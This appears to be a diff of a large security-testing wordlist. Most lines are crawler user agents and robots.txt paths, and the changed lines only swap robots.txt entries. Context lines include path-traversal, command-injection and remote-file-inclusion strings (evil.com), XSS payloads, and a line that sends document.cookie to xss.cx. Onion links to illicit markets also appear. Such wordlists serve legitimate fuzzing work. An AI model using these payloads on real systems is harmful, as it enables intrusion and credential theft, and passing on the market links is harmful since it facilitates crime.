 baiduspider+(+http://help.baidu.jp/system/05.html)
@@ -12818,7 +12818,7 @@ baiduspider-image+(+http://www.baidu.com/search/spider.htm)\nreferer: http://ima
 baiduspider-image+(+http://www.baidu.com/search/spider.htm)\nreferer: http://image.baidu.com/i?ct=503316480&z=0&tn=baiduimagedetail
 balihoo/nutch-1.0-dev (crawler for balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)
 bappstore/bapps/download/http://br.linkedin.com/robots.txt
-bappstore/bapps/download/http://chat.whatsapp.com/robots.txt
+bappstore/bapps/download/http://umweltbundesamt.de/robots.txt
 barh1\\1
 base_path=http://www.evil.com/getdata.php
 batista1\\\\1
@@ -12942,8 +12942,8 @@ bikash dash http://in.linkedin.com/in/engineerbikashdash
 bilgibetabot/0.8-dev (bilgi.com (beta) ; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)
 bilgibot/1.0(beta) (http://www.bilgi.com/; bilgi at bilgi dot com)
 billybobbot/1.0 (+http://www.billybobbot.com/crawler/)
-bin/*http://afb.org/robots.txt
 bin/*http://agilealliance.org/robots.txt
+bin/*http://sites.tufts.edu/robots.txt
 binget/1.00.a (http://www.bin-co.com/php/scripts/load/)
 bio\\28
 bio\\31
@@ -12964,15 +12964,14 @@ blaiz-bee/2.00.xxxx (+http://www.blaiz.net)
 blausen*http://blog.archive.org/robots.txt
 blausen*http://mamamia.com.au/robots.txt
 blausen*http://people.mozilla.org/robots.txt
-blausen*http://wpastra.com/robots.txt
+blausen*http://pinterest.co.kr/robots.txt
 blog/.html.*http://google.de/robots.txt
-blog/.html.*http://latimes.com/robots.txt
-blog/.html.*http://roblox.com/robots.txt
+blog/.html.*http://kantar.com/robots.txt
+blog/.html.*http://samsung.com/robots.txt
 blog/.html.*http://venmo.com/robots.txt
 blog/category/http://sucuri.net/robots.txt
-blog/page/http://artnews.com/robots.txt
-blog/webmentions/receive/http://epi.org/robots.txt
-blog?page=http://pbskids.org/robots.txt
+blog/page/http://freedomscientific.com/robots.txt
+blog/webmentions/receive/http://arts.ac.uk/robots.txt
 blog?page=http://thenation.com/robots.txt
 blogbridge 2.13 (http://www.blogbridge.com/)
 bloglines title fetch/1.0 (http://www.bloglines.com)
@@ -12980,7 +12979,6 @@ bloglines-images/0.1 (http://www.bloglines.com)
 bloglines/3.0-rho (http://www.bloglines.com; 3 subscribers)
 bloglines/3.1 (http://www.bloglines.com)
 blogmap (http://www.feedmap.net)
-blogs/all/tagged*http://autoscout24.de/robots.txt
 blogs/all/tagged*http://msdmanuals.com/robots.txt
 blogsearch/1.x +http://www.icerocket.com/
 blogsnowbot&#44; v 2.01 (+http://www.blogsnow.com/)
@@ -13071,7 +13069,7 @@ bookmark buddy bookmark checker (http://www.bookmarkbuddy.net/)
 bookmark renewal check agent [http://www.bookmark.ne.jp/]
 bookmark renewal check agent [http://www.bookmark.ne.jp/] (version 2.0beta)
 bookmarkbase(2/;http://bookmarkbase.com)
-books/*/http://hyundai.com/robots.txt
+books/*/http://naturalnews.com/robots.txt
 borg\\7
 bozx#h\\si[i9~vjmyzi#+?6
 bqk,*/t"kn|@p#o"rqz-0nuzz|<<\\m
@@ -13079,7 +13077,6 @@ bqneh\\3
 br7qky8uedy4]2\\dj\{xrq_6~;fm[?}
 brainmagic: http://ll6lardicrvrljvq.onion/
 brandnew/psphttp://cvs.com/robots.txt
-brandnew/psphttp://nicovideo.jp/robots.txt
 brchh\\21
 brchh\\3
 brchh\\30
@@ -13097,7 +13094,7 @@ brchh\\\8
 brchh\\\9
 bridges.torproject.org: http://z5tfsnikzulwicxs.onion/
 brightcrawler (http://www.brightcloud.com/brightcrawler.asp)
-brlhttp://gov.br/robots.txt
+brlhttp://thehackernews.com/robots.txt
 browse/catalogue-full/*/albumshttp://blogs.worldbank.org/robots.txt
 browse/catalogue-full/*/albumshttp://chapters.indigo.ca/robots.txt
 browserqtwebmozilla/5.0 (windows; u; windows nt 5.1; en-us) applewebkit/527+ (khtml, like gecko) qtweb internet browser/1.2 http://www.qtweb.net
@@ -13139,7 +13136,7 @@ bulkfeeds/r1752 (http://bulkfeeds.net/)
 burmese/search/\?query=.
 burstfindcrawler/1.1 (crawler.burstfind.com; http://crawler.burstfind.com; crawler@burstfind.com)
 buscadorhttp://beliefnet.com/robots.txt
-buscadorhttp://statefarm.com/robots.txt
+buscadorhttp://gsmarena.com/robots.txt
 buscaplus robi/1.0 (http://www.buscaplus.com/robi/)
 butikdetay*/http://wicg.github.io/robots.txt
 buy cheap iphones: http://xyt4inlajwmn3gfb.onion/
@@ -13202,7 +13199,7 @@ c\\dt4zfw'1x])?o<si/b6c0wuuiiop
 ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini
 ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd
 ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini
-ca/http://viber.com/robots.txt
+ca/http://sportskeeda.com/robots.txt
 cabot/nutch-0.9 (amfibi's web-crawling robot; http://www.amfibi.com/cabot/; agent@amfibi.com)
 cabot/nutch-1.0-dev (amfibi's web-crawling robot; http://www.amfibi.com/cabot/; agent@amfibi.com)
 cad\\
@@ -13238,10 +13235,11 @@ cadehp\\7
 cae\\0
 caetano94\\\\3
 calc\\8
-calendar/*http://canvas.instructure.com/robots.txt
+calendar/*http://fandom.com/robots.txt
 calendar/*http://teepublic.com/robots.txt
 cameron dawe https://twitter.com/spam404online
 campaigns/digital-recruitmenthttp://ah.nl/robots.txt
+campaigns/digital-recruitmenthttp://assets.website-files.com/robots.txt
 can\\\'tbeleiveit
 canard-jitsu/1.0; (http://canard-jitsu.world-servers.com; compatible; windows nt 6.1) canard-jitsu/1.0
 cannabisuk: http://fzqnrlcvhkgbdwx5.onion/
@@ -13289,7 +13287,7 @@ cat\\9
 catchbot/1.0; +http://www.catchbot.com
 catchbot/1.0; http://www.catchbot.com
 catchbot/2.0; +http://www.catchbot.com
-category/good-bites/http://pt.slideshare.net/robots.txt
+category/good-bites/http://nero.com/robots.txt
 category/good-bites/http://redcross.org.uk/robots.txt
 cats/\"920399=1
 cazoodlebot/cazoodlebot-0.1 (cazoodlebot crawler; http://www.cazoodle.com/cazoodlebot; cazoodlebot@cazoodle.com)
@@ -13307,20 +13305,20 @@ cdc\\23
 cdc\\\4
 cdl\\3
 cdn-cgi/http://account.google.com/robots.txt
-cdn-cgi/http://cbre.com/robots.txt
 cdn-cgi/http://google.qualtrics.com/robots.txt
+cdn-cgi/http://hive.blog/robots.txt
 cdn-cgi/http://insightly.com/robots.txt
-cdn-cgi/http://kids.youtube.com/robots.txt
 cdn-cgi/http://markdownguide.org/robots.txt
-cdn-cgi/http://thegraphicsfairy.com/robots.txt
+cdn-cgi/http://mdpi.com/robots.txt
+cdn-cgi/http://thesouthafrican.com/robots.txt
+cdn-cgi/http://universalmusic.com/robots.txt
 cdn-cgi/http://vice.com/robots.txt
-cdn-cgi/http://wearesocial.com/robots.txt
 cdn-cgi/http://what3words.com/robots.txt
-cdn-cgi/zaraz/http://animoto.com/robots.txt
+cdn-cgi/zaraz/http://deezer.com/robots.txt
 cdn-cgi/zaraz/http://eji.org/robots.txt
+cdn-cgi/zaraz/http://ibb.co/robots.txt
 cdn-cgi/zaraz/http://ok.ru/robots.txt
-cdn-cgi/zaraz/http://youtube-creators.googleblog.com/robots.txt
-cdp/webhooks/http://farm4.static.flickr.com/robots.txt
+cdp/webhooks/http://ad.nl/robots.txt
 cdr/1.7.1 simulator/0.7(+http://timewe.net) profile/midp-1.0 configuration/cldc-1.0
 cds\8\\8
 cds\\
@@ -13330,7 +13328,7 @@ cds\\55
 cds\\613
 cds\\952
 cds\\\9
-centers/mrcbg/programs/growthpolicy/search?http://illinois.edu/robots.txt
+centers/mrcbg/programs/growthpolicy/search?http://japan.zdnet.com/robots.txt
 centiversebot/3.0 (http://www.centiverse-project.net)
 ceramic tile installation guide (http://www.floorstransformed.com)
 cfa\\27
@@ -13339,6 +13337,7 @@ cfa\\72
 cfdev03\\4
 cfdocs/exampleapp/email/getfile.cfm?filename=c:\\boot.ini
 cfdocs/exampleapp/email/getfile.cfm?filename=c\\boot.ini
+cfdocs/legis/pn/public/btcheck.cfmhttp://inquisitr.com/robots.txt
 cfide/debug/cf_debugfr.cfm?userpage=http%3a%2f%2fgoogle.com
 cgi-bin/..\\..\\..\\..\\..\\..\\winnt\system32\cmd.exe?/c+dir+c:\\
 cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,
@@ -13358,11 +13357,11 @@ cgi-bin/test.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
 cgi-bin/tst.bat|dir20..\\..\\..\\..\\..\\..\\..\\..\\
 cgi-binhttp://baidu.com/robots.txt
-cgi-binhttp://enterprisemarketingportal.google/robots.txt
+cgi-binhttp://iheart.com/robots.txt
 cgi-binhttp://phys.org/robots.txt
 cgi-binhttp://similarweb.com/robots.txt
-changelanguagehttp://ionic.io/robots.txt
-chat/*http://matchesfashion.com/robots.txt
+changelanguagehttp://newgrounds.com/robots.txt
+chat/*http://ezoic.com/robots.txt
 chat/*http://statefarm.com/robots.txt
 che\\
 che\\1
@@ -13374,8 +13373,8 @@ cheap giftcards http://steam7qrjknfhmf6.onion/
 cheap stolen android phones: http://3pkm74bnuxdbaxlr.onion
 checkouthttp://accidentinjurylawyers.claims/robots.txt
 checkouthttp://bellascolegialas.info/robots.txt
-checkouthttp://dinotim.com/robots.txt
-checkouthttp://lenovo.com/robots.txt
+checkouthttp://gigaom.com/robots.txt
+checkouthttp://mobile.twitter.com/robots.txt
 chefem\\'08
 chelsea99\\'
 cherry\\3
@@ -13396,8 +13395,8 @@ cipolla 2.0 [italian]: http://cipollatnumrrahd.onion/
 cithe\\04
 citistreet.com/1.0+(compatible;mozilla/5.0;msie 7.0;++http://citistreet.com/)
 cityreview robot (+http://www.cityreview.org/crawler/)
-clasificados/http://feedback.userreport.com/robots.txt
 clasificados/http://fotmob.com/robots.txt
+clasificados/http://hidemyass.com/robots.txt
 class.module.classloader.urls%5b0%5d=http://a.com
 clasys ltd. - http://www.clasys.com
 clear\\5
@@ -13418,7 +13417,7 @@ cm4nlmhacking\\\\\\\\\\\\\\\'s
 cm\\35b30
 cm\\45a17
 cmb\\5
-cms/view/editorial_boardhttp://collections.vam.ac.uk/robots.txt
+cms/view/editorial_boardhttp://earthlink.net/robots.txt
 cn/events/huaweiconnect/sessions-on-demand*http://viber.com/robots.txt
 cocoal.icio.us/1.0 (v36) (mac os x; http://www.scifihifi.com/cocoalicious)
 cocoal.icio.us/1.0 (v38) (mac os x; http://www.scifihifi.com/cocoalicious)
@@ -13427,9 +13426,9 @@ cocoal.icio.us/1.0 (v43) (mac os x; http://www.scifihifi.com/cocoalicious)
 cogentbot/1.x (+http://www.cogentsoftwaresolutions.com/bot.html)
 colbyo\\'donis
 collection.phphttp://bellaonline.com/robots.txt
-collection.phphttp://husqvarna.com/robots.txt
+collection.phphttp://sante.gouv.fr/robots.txt
+collection/editor/http://access.redhat.com/robots.txt
 collection/editor/http://ionic.io/robots.txt
-collection/editor/http://webassembly.org/robots.txt
 collector.testnet.torproject.org: http://vhbbidwvzwhahsrg.onion/
 collector2.torproject.org: http://kkvj4mhsttfcrksj.onion/
 color:black'><a href="http://www.perldoc.com/perl5.6/pod/perlfunc.html"
@@ -13445,17 +13444,17 @@ combine/2.0 http://combine.it.lth.se/
 combine/3 http://combine.it.lth.se/
 cometrics-bot&#44; http://www.cometrics.de
 comiccontrol/http://console.developers.google.com/robots.txt
-comiccontrol/http://developer.wordpress.org/robots.txt
-commentshttp://edutopia.org/robots.txt
+comiccontrol/http://ocw.mit.edu/robots.txt
+commentshttp://de-de.facebook.com/robots.txt
 commentshttp://rijksmuseum.nl/robots.txt
 common sense by thomas paine: http://duskgytldkxiuqc6.onion/comsense.html
-common-results-pagehttp://keepandshare.com/robots.txt
+common-results-pagehttp://canlii.org/robots.txt
 common-results-pagehttp://navercorp.com/robots.txt
+common/trial/http://urban.org/robots.txt
 common/trial/http://v.youku.com/robots.txt
-common/trial/http://xyz.com/robots.txt
+community/*/post-*http://disneyworld.disney.go.com/robots.txt
 community/*/post-*http://nobelprize.org/robots.txt
-community/*/post-*http://thespruce.com/robots.txt
-community/donations/thanks_paypal/http://emag.hu/robots.txt
+community/donations/thanks_paypal/http://epa.ie/robots.txt
 community/donations/thanks_paypal/http://owntracks.org/robots.txt
 community/user/ibmtechxchangenorthtexasautomationusergroup/http://marxists.org/robots.txt
 compatible;baiduspider/2.0; +http://www.baidu.com/search/spider.html
@@ -13490,37 +13489,36 @@ config/sample_training_data/positive/http%3a%2f%2fwww.publichealthontario.ca%2fe
 confirm(window.tostatichtml('<base href="http://xss.cx/"></base>'));
 confirmation/http://baylor.edu/robots.txt
 confirmation?http://roughguides.com/robots.txt
+connect/http://blog.twitter.com/robots.txt
 connect/http://irishtimes.com/robots.txt
-connect/http://marketingplatform.google.com/robots.txt
 connect/http://pwc.com/robots.txt
 consensus-health.torproject.org: http://tgnv2pssfumdedyw.onion/
-contact-sales/http://calendar.perfplanet.com/robots.txt
+contact-sales/http://ghostery.com/robots.txt
 contact-sales/http://lists.w3.org/robots.txt
-content/dam/munichre/brandportal/guidelines/*/*/*/*/*.pdfhttp://neatorama.com/robots.txt
-content/dam/students/documents/graduations/programs/http://realsimple.com/robots.txt
+content/dam/munichre/brandportal/guidelines/*/*/*/*/*.pdfhttp://db.com/robots.txt
+content/dam/students/documents/graduations/programs/http://teamviewer.com/robots.txt
 content/downloads/http://developer.yahoo.com/robots.txt
-content/index.php/user/logout/http://ecwid.com/robots.txt
-content/public/wbc/en/_services/calcs-forms-tools/http://edp24.co.uk/robots.txt
-content/shared/en/profiles/*http://kompas.com/robots.txt
-content/websites/us/en/noindex/*http://discord.com/robots.txt
+content/index.php/user/logout/http://bain.com/robots.txt
+content/public/wbc/en/_services/calcs-forms-tools/http://indiatvnews.com/robots.txt
+content/shared/en/profiles/*http://mytheresa.com/robots.txt
 content/websites/us/en/noindex/*http://event.on24.com/robots.txt
-content/websites/us/en/noindex/*http://whatsapp.com/robots.txt
+content/websites/us/en/noindex/*http://venmo.com/robots.txt
+content/websites/us/en/noindex/*http://x.com/robots.txt
 converacrawler/0.9 (+http://www.authoritativeweb.com/crawl)
 converacrawler/0.9c (+http://www.authoritativeweb.com/crawl)
 converacrawler/0.9d ( http://www.authoritativeweb.com/crawl)
 converacrawler/0.9d (+http://www.authoritativeweb.com/crawl)
 converacrawler/0.9e (+http://ews.converasearch.com/crawl.htm)
 converamultimediacrawler/0.1 (+http://www.authoritativeweb.com/crawl)
-core/unlocking-power-rda-joint-workshop-nardac-and-pcc-sct-rda-training-task-grouphttp://goldmansachs.com/robots.txt
-corporate-culture/inner/http://close.com/robots.txt
+core/unlocking-power-rda-joint-workshop-nardac-and-pcc-sct-rda-training-task-grouphttp://hbs.edu/robots.txt
 corporate-culture/inner/http://espncricinfo.com/robots.txt
-corporate-culture/inner/http://mdbg.net/robots.txt
+corporate-culture/inner/http://oll.libertyfund.org/robots.txt
 corporate-culture/inner/http://yoox.com/robots.txt
 cougarsearch/0.x (+http://www.cougarsearch.com/faq.shtml)
 counterfeit usd: http://qkj4drtgvpm7eecl.onion/
+courses/http://i.ebayimg.com/robots.txt
 courses/http://pxhere.com/robots.txt
-courses/http://zozo.jp/robots.txt
-courses/online-shkoly/zapusk-online-shkolyhttp://dansique.com/robots.txt
+courses/online-shkoly/zapusk-online-shkolyhttp://animatemeapp.com/robots.txt
 courses/online-shkoly/zapusk-online-shkolyhttp://shanghaiechocompanylimited.com/robots.txt
 covario-ids/1.0 (covario; http://www.covario.com/ids; support at covario dot com)
 covarioids/1.1 (http://www.covario.com/ids; support at covario dot com)
@@ -13561,7 +13559,7 @@ crchh\\\8
 crchh\\\9
 crchh\\b
 creativecommons/0.06-dev (nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@lists.sourceforge.net)
-creator-toolkitshttp://bugs.mysql.com/robots.txt
+creator-toolkitshttp://ai.facebook.com/robots.txt
 croccrawler vx.3 [en] (http://www.croccrawler.com) (x11; i; linux 2.0.44 i686)
 crowdshield xss agent"><script/src=https://crowdshield.com/.testing/useragent.js>
 cs\1\\333
@@ -13718,13 +13716,12 @@ d\\\3s323
 d\\\costa
 d\\l
 d\\w
-dam/udelimages/student-life/reslife/floorplanshttp://newegg.com/robots.txt
+dam/udelimages/student-life/reslife/floorplanshttp://degruyter.com/robots.txt
 dan mcinerney https://github.com/danmcinerney
 dark nexus: http://e266al32vpuorbyg.onion/bookmarks.php
 data-bay: http://jvrnuue4bvbftiby.onion/
 data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;sign_up&quot;,&quot;originating_url&quot;:&quot;https://github.com/coffinxp/payloads/blob/main/env.txt&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f465cd482c3877b7ac865e6f6eaca642f7d7a5d64f60680b5de100f76082d2fc"
 data-protection/our-role-supervisor/complaints/edps-complaint-form*http://fedex.com/robots.txt
-data-protection/our-role-supervisor/complaints/edps-complaint-form*http://timeout.com/robots.txt
 datafountains/dmoz downloader (http://ivia.ucr.edu/useragents.shtml)
 datafountains/dmoz feature vector corpus creator (http://ivia.ucr.edu/useragents.shtml)
 dataparksearch/4.35 ( http://www.dataparksearch.org/)
@@ -13774,7 +13771,7 @@ deepblog: http://xzzpowtjlobho6kd.onion/wordpress/
 deepindex ( http://www.zetbot.com )
 deepweb: http://kpmp444tubeirwan.onion/
 default.asp\\
-default_image.psdhttp://books.google.de/robots.txt
+default_image.psdhttp://aao.org/robots.txt
 default_image.psdhttp://merkle.com/robots.txt
 deis\\1
 deis\\4
@@ -13786,7 +13783,7 @@ delta initiative: http://bbxdfsru7lmmbj32.onion/marketplace/
 demo 1 at `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php`
 demo 2 at `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3`
 demo/safari-reader-test-nielshttp://macys.com/robots.txt
-demo/safari-reader-test-nielshttp://politico.eu/robots.txt
+demo/safari-reader-test-nielshttp://space.com/robots.txt
 denmex websearch (http://search.denmex.com)
 department of computing            | http://www.doc.mmu.ac.uk/staff/mikew.html
 dept\\
@@ -13813,18 +13810,18 @@ dingjie yang http://www.websecuritylens.org
 dir%20c:\\
 dir=http://www.evil.com/getdata.php
 directors/http://crisistextline.org/robots.txt
-directors/http://fs.blog/robots.txt
+directors/http://notonthehighstreet.com/robots.txt
 disastrous/1.0.5 (running with python 2.5.1; http://www.bortzmeyer.org/disastrous.html; archangel77@del.icio.us)
-discussion-forum/http://colt.net/robots.txt
+discussion-forum/http://chromeenterprise.google/robots.txt
 discussion-forum/http://rapidtables.com/robots.txt
 distributed denial of service attacks: http://www.icsa.net/
 django-admin/http://section508.gov/robots.txt
-dl-own-domain/http://selenium.dev/robots.txt
+dl-own-domain/http://alaraby.co.uk/robots.txt
 dl\\ot~y9d"=sgcz@f>0[q%/ahgz<ja
-dms_priv/*http://webfx.com/robots.txt
+dms_priv/*http://flightradar24.com/robots.txt
 dms_priv/*http://www3.nhk.or.jp/robots.txt
 dna/matches/http://mysite.com/robots.txt
-doc/http://toonsmag.com/robots.txt
+doc/http://moh.gov.sg/robots.txt
 docomo/2.0 n905i(c100;tb;w24h16) (compatible; googlebot-mobile/2.1;  http://www.google.com/bot.html)
 docomo/2.0 n905i(c100;tb;w24h16) (compatible; googlebot-mobile/2.1; +http://www.google.com/bot.html)
 docomo/2.0 p900i(c100;tb;w24h11) (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/help/article/1142/)
@@ -13833,16 +13830,16 @@ docomo/2.0 p900i(c100;tb;w24h11) (compatible; ichiro/mobile goo;+http://search.g
 docomo/2.0 sh902i (compatible; y!j-srd/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)
 docomo/2.0/so502i (compatible; y!j-srd/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)
 docpicker/common_proxy/http/www.redbooks.ibm.com/redbooks.nsf/redbookabstracts/sg247798.html?logout&redirectto=http://example.com
-docs/*/http://images.google.fr/robots.txt
+docs/*/http://flsenate.gov/robots.txt
 docs/*/http://radiofobia.com.br/robots.txt
-doctors/resultshttp://hostingadvice.com/robots.txt
+doctors/resultshttp://contentsquare.com/robots.txt
 doctors/resultshttp://kauffman.org/robots.txt
 document.getelementsbyname("login").item(0).src = http://xss.cx/
 document.location="http://xss.cx/default.aspx?c=" + document.cookie
 document\\x2ebody\\x2eappendchild(_);`),"')
 document\\x2ebody\\x2eappendchild(_);`),a')
 document_root=http://www.evil.com/getdata.php
-documents/departments/ethicselections/democracyvoucher/http://litmus.com/robots.txt
+documents/departments/ethicselections/democracyvoucher/http://instapaper.com/robots.txt
 domain re-animator bot (http://domainreanimator.com) - support@domainreanimator.com
 domain\\user
 domain\\username
@@ -13890,7 +13887,7 @@ dx5\\9
 dx\\
 dxal\\3
 dxp-search-integration/http://isoc.org/robots.txt
-dxp-search-integration/http://nylon.com/robots.txt
+dxp-search-integration/http://livre.fnac.com/robots.txt
 e"ftnmxzk\\g7
 e''is*e=v\\j0!^u''(%bdb[ay-{^ph!y
 e)vq$bq;)`8kud>g5?1g&ie'a?u\\)
@@ -13983,8 +13980,8 @@ eli/20070402:2.0 (daum rss robot&#44; daum communications corp.; +http://ws.daum
 elmer\\'s
 eltro10\\\"
 el}!x&5uty[\\ei3cnsryt>swx%4e)[
+email-contact/nodehttp://brightside.me/robots.txt
 email-contact/nodehttp://groupme.com/robots.txt
-email-contact/nodehttp://schedulicity.com/robots.txt
 email\\\"121
 emav\\4
 embeddedwb 14.33 from: http://www.bsalsa.com/
@@ -13992,14 +13989,14 @@ emeraldshield.com webbot (http://www.emeraldshield.com/webbot.aspx)
 emo/emo-1.php\\"
 emp\\shell.exe;60
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0acontent-type%3a%20text%2fhtml%0alocation%3a%20http%3a%2f%2fcrowdshield.com%0acontent-length%3a%20122%0a%3chtml%3e%3cbody%20onload%3dalert('xss')%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e%3ciframe%20src%3d%22javascript%3aalert('xss')%3b%22%3e%3c%2fiframe%3e%3c%2fbody%3e%3c%2fhtml%3e
+en-tr/cart/http://gnavi.co.jp/robots.txt
 en-tr/cart/http://ifrs.org/robots.txt
-en-tr/cart/http://refinitiv.com/robots.txt
-en/customer-services/points-attention/appointment-request-formhttp://mitpressjournals.org/robots.txt
+en/customer-services/points-attention/appointment-request-formhttp://lbry.com/robots.txt
 en/customer-services/points-attention/appointment-request-formhttp://teachable.com/robots.txt
-en/microsites/http://cpj.org/robots.txt
+en/microsites/http://asahi.com/robots.txt
 en/microsites/http://fas.org/robots.txt
 en/searchpage.htmlhttp://bom.gov.au/robots.txt
-en/searchpage.htmlhttp://matomo.org/robots.txt
+en/searchpage.htmlhttp://lucidchart.com/robots.txt
 enabot/1.x (http://www.enaball.com/crawler.html)
 encyclopedia dramatica: http://edramalpl7oq5npk.onion/main_page
 endo/1.0 (mac os x; ppc i386; http://kula.jp/endo)
@@ -14036,7 +14033,7 @@ erodir: http://orsxvca7glswueo7.onion/
 es-us/*http://v0.wordpress.com/robots.txt
 es.net_crawler/2.0 (http://search.innerprise.net/)
 es/search?*http://gravityforms.com/robots.txt
-es/search?*http://nastygal.com/robots.txt
+es/search?*http://sports.ru/robots.txt
 esperanzabot(+http://www.esperanza.to/bot/)
 essence appengine-google; (+http://code.google.com/appengine; appid: e~phpoembed)
 etlxd\\1m
@@ -14064,7 +14061,7 @@ exb language crawler 2.1.4 (+http://www.exb.de/crawler)
 exb language crawler 2.1.5 (+http://www.exb.de/crawler)
 execrawl/1.0 (execrawl; http://www.execrawl.com/; bot@execrawl.com)
 exit.htmlhttp://enterprise.google.com/robots.txt
-exit.htmlhttp://epicor.com/robots.txt
+exit.htmlhttp://planet.com/robots.txt
 exonerator.torproject.org: http://zfu7x4fuagirknhb.onion/
 exooba crawler/exooba crawler (crawler for exooba.com; http://www.exooba.com/; info at exooba dot com)
 exploit description: (submitted by franz sedlmaier http://www.pilorz.net/).  this xss vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like boyer-moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  the double slash comments out the ending extraneous bracket to supress a javascript error.
@@ -14119,10 +14116,10 @@ exploit string: <xml src="http://ha.ckers.org/xsstest.xml" id=i></xml><span data
 exploit string: <xss style="behavior: url(http://ha.ckers.org/xss.htc);">
 exploit string: redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 exploit string: res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
-export/site-selector.jsonhttp://paytm.com/robots.txt
 export/site-selector.jsonhttp://samaritans.org/robots.txt
 external.navigateandfind('http://xss.cx',[],[])
 externalcontentview/http://cims.nyu.edu/robots.txt
+externalcontentview/http://feedback.userreport.com/robots.txt
 externalinterface.call("eval","mywindow=window.open('','','width=200,height=100'); mywindow.document.write(\"<html><head><script src=\'http://xss.cx/xss.js\'></script></head><body>hi</body></html>\");mywindow.focus()");
 extra.torproject.org: http://klbl4glo2btuwyok.onion/
 e|r6ra1>81s<k0qi=nyg3x}kxxe@z\\
@@ -14227,8 +14224,8 @@ fastbot crawler beta 2.0 (+http://www.fastbot.de)
 fastbug http://www.ay-up.com
 favcollector/2.0 (info@favcollector.com http://www.favcollector.com/)
 favicon.icohttp://abc.net.au/robots.txt
+favicon.icohttp://blog.google/robots.txt
 favicon.icohttp://gizmodo.com/robots.txt
-favicon.icohttp://lh6.googleusercontent.com/robots.txt
 favo.eu crawler/0.6 (http://www.favo.eu)
 favorites checking (http://campulka.net)
 fawlty\\0
@@ -14254,13 +14251,14 @@ fe\\\6
 fe\\\7
 fe\\\8
 fe\\\9
-features/aerisweather-javascript-sdk/http://linuxquestions.org/robots.txt
 features/aerisweather-javascript-sdk/http://s.imgur.com/robots.txt
-features/http://fileformat.info/robots.txt
+features/aerisweather-javascript-sdk/http://smittenkitchen.com/robots.txt
+features/http://blogs.skype.com/robots.txt
 features/http://iau.org/robots.txt
 features/http://lacoste.com/robots.txt
 features/http://moomin.com/robots.txt
 features/http://simplenote.com/robots.txt
+features/http://stnicholascenter.org/robots.txt
 feds\\
 feds\\4
 feds\\5
@@ -14281,7 +14279,7 @@ feed%2fhttp%3a%2f%2fspaces
 feed%2fhttp%3a%2f%2fwww
 feed%2fhttp%3a%2f%2fxenomachina
 feed/\
-feed/http://tenantcloud.com/robots.txt
+feed/http://batcon.org/robots.txt
 feed/rss/\
 feeddemon/2.7 (http://www.newsgator.com/; microsoft windows xp)
 feeddemon/4.5 (http://www.feeddemon.com/; microsoft windows)
@@ -14320,13 +14318,12 @@ files/90x60/\\{value.foto\}
 files/logos/\\{development.logo\}
 filetype:swf inurl:xml site:http://target.com
 filetype:url +inurl:\"ftp://\" +inurl:\";@\"
-filing/free-file-fillable-forms/free-file-fillable-forms-support-2http://ameblo.jp/robots.txt
 filing/free-file-fillable-forms/free-file-fillable-forms-support-2http://iana.org/robots.txt
-filing/free-file-fillable-forms/free-file-fillable-forms-support-2http://twilio.com/robots.txt
+filing/free-file-fillable-forms/free-file-fillable-forms-support-2http://iso.org/robots.txt
+filing/free-file-fillable-forms/free-file-fillable-forms-support-2http://photos.google.com/robots.txt
 fimap http://code.google.com/p/fimap/
 finarch\\acr
-find/*http://ahrefs.com/robots.txt
-find/*http://buymeacoffee.com/robots.txt
+find/*http://freepik.com/robots.txt
 find/*http://namecheap.com/robots.txt
 findexa crawler (http://www.findexa.no/gulesider/article26548.ece)
 findlinks/1.0 (+http://wortschatz.uni-leipzig.de/findlinks/)
@@ -14377,14 +14374,15 @@ followsite bot ( http://www.followsite.com/bot.html )
 followsite.com ( http://www.followsite.com/b.html )
 fonts\\[\w]+\.exe$;45
 fooky.com/scorpionbot/scoutout; http://www.fooky.com/scorpionbots
-forgov-devhttp://bfi.org.uk/robots.txt
+forgov-devhttp://bitfinex.com/robots.txt
 forgov-devhttp://sciencesetavenir.fr/robots.txt
 form-responses/*http://www3.weforum.org/robots.txt
 formhandler.cgi?realname=aaa&email=aaa&reply_message_template=%2fetc%2fpasswd&reply_message_from=sq%40example.com&redirect=http%3a%2f%2fwww.example.com&recipient=sq%40example.com
-forum/ucp.phphttp://adweek.com/robots.txt
 forum/ucp.phphttp://cambridge.org/robots.txt
-forum/ucp.phphttp://roxanegay.com/robots.txt
+forum/ucp.phphttp://embassybel.ru/robots.txt
+forum/ucp.phphttp://schurorthodontics.com/robots.txt
 forums/users/http://coveteur.com/robots.txt
+forums/users/http://kcet.org/robots.txt
 francis/1.0 (francis@neomo.de http://www.neomo.de/)
 fravia'92s web searching lore: http://nwycvryrozllb42g.onion/searchlores/index.htm
 freefind.com-sitesearchengine/1.0 (http://freefind.com; spiderinfo@freefind.com)
@@ -14392,7 +14390,7 @@ freenet fms forums: http://xdagknwjc7aaytzh.onion/20/http/1.4.7.9/forummain.htm
 frelicbot/1.0 +http://www.frelic.com/
 frnk\\11
